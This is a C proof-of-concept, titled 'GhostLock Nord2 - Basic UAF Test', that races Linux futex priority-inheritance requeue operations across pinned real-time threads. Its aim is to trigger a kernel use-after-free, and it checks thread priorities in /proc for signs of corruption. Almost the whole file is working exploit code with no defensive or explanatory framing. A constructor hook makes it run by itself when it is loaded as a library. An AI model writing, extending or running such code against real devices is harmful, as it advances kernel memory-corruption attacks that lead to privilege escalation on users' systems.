// GhostLock Nord2 - Basic UAF Test (no spray)

#define _GNU_SOURCE
#include <pthread.h>
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sched.h>
#include <sys/resource.h>
#include <sys/syscall.h>
#include <linux/futex.h>
#include <stdatomic.h>
#include <errno.h>

#ifndef SYS_futex
#define SYS_futex 98
#endif

static uint32_t f_wait = 0;
static uint32_t f_pi_target = 0;
static atomic_int owner_ready = 0;
static atomic_int waiter_ready = 0;
static atomic_int stop_race = 0;

static int read_task_prio(uint32_t tid) {
    char path[64]; snprintf(path, sizeof(path), "/proc/%u/stat", tid);
    FILE *f = fopen(path, "r"); if (!f) return -1;
    int pid; char comm[256]; char state;
    fscanf(f, "%d %s %c", &pid, comm, &state);
    long tmp; for (int i = 0; i < 14; i++) fscanf(f, " %ld", &tmp);
    int prio = -1; fscanf(f, " %d", &prio);
    fclose(f); return prio;
}

void *owner_thread_fn(void *arg) {
    (void)arg;
    cpu_set_t cpuset; CPU_ZERO(&cpuset); CPU_SET(0, &cpuset);
    sched_setaffinity(0, sizeof(cpuset), &cpuset);
    
    struct sched_param sp = { .sched_priority = 50 };
    sched_setscheduler(0, SCHED_FIFO, &sp);
    
    syscall(SYS_futex, &f_pi_target, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
    atomic_store(&owner_ready, 1);
    
    while (!atomic_load(&stop_race)) {
        syscall(SYS_futex, &f_pi_target, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
        syscall(SYS_futex, &f_pi_target, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
        usleep(10);
    }
    
    sp.sched_priority = 0;
    sched_setscheduler(0, SCHED_OTHER, &sp);
    return NULL;
}

void *waiter_thread_fn(void *arg) {
    (void)arg;
    cpu_set_t cpuset; CPU_ZERO(&cpuset); CPU_SET(1, &cpuset);
    sched_setaffinity(0, sizeof(cpuset), &cpuset);
    setpriority(PRIO_PROCESS, 0, -5);
    
    atomic_store(&waiter_ready, 1);
    struct timespec ts; clock_gettime(CLOCK_MONOTONIC, &ts); ts.tv_sec += 60;
    syscall(SYS_futex, &f_wait, FUTEX_WAIT_REQUEUE_PI, 0, &ts, &f_pi_target, 0);
    return NULL;
}

int main(void) {
    static int ran = 0;
    if (ran) return 0;
    ran = 1;
    
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stderr, NULL, _IONBF, 0);
    
    fprintf(stderr, "=== GhostLock Nord2 - Basic UAF ===\n\n");
    
    cpu_set_t cpuset; CPU_ZERO(&cpuset); CPU_SET(2, &cpuset);
    sched_setaffinity(0, sizeof(cpuset), &cpuset);
    
    fprintf(stderr, "[*] Starting owner (SCHED_FIFO 50)...\n");
    pthread_t owner_thr;
    pthread_create(&owner_thr, NULL, owner_thread_fn, NULL);
    while (!atomic_load(&owner_ready)) {}
    
    fprintf(stderr, "[*] Running 10 attempts (look for prio != 15)...\n");
    
    for (int i = 0; i < 10; i++) {
        f_wait = 0;
        atomic_store(&waiter_ready, 0);
        
        pthread_t waiter_thr;
        pthread_create(&waiter_thr, NULL, waiter_thread_fn, NULL);
        while (!atomic_load(&waiter_ready)) {}
        
        usleep(1000);
        
        int ret = syscall(SYS_futex, &f_wait, FUTEX_CMP_REQUEUE_PI, 1, (void*)1, &f_pi_target, 0);
        
        if (ret == 1) {
            uint32_t tid = f_pi_target & 0x3FFFFFFF;
            int p = read_task_prio(tid);
            fprintf(stderr, "[%d] prio=%d\n", i, p);
        }
        
        pthread_detach(waiter_thr);
    }
    
    atomic_store(&stop_race, 1);
    fprintf(stderr, "\n[DONE]\n");
    return 0;
}

__attribute__((constructor))
void init(void) { main(); }
